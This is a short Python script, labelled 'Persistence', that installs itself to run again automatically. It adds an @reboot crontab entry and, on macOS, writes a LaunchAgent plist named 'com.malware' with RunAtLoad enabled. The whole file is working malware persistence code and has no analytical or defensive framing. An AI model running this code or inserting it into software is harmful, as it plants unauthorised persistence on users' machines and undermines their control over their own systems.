#!/usr/bin/env python3

"""Persistence - persistence"""
import os
import sys

# Cron job persistence
cron_cmd = "@reboot python3 " + os.path.abspath(__file__)
os.system(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -')

# Startup item (macOS)
if sys.platform == "darwin":
    plist = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.malware</string>
    <key>ProgramArguments</key>
    <array><string>python3</string><string>{}</string></array>
    <key>RunAtLoad</key><true/>
</dict>
</plist>""".format(os.path.abspath(__file__))
    os.makedirs(os.path.expanduser("~/Library/LaunchAgents"), exist_ok=True)
    with open(os.path.expanduser("~/Library/LaunchAgents/com.malware.plist"), "w") as f:
        f.write(plist)
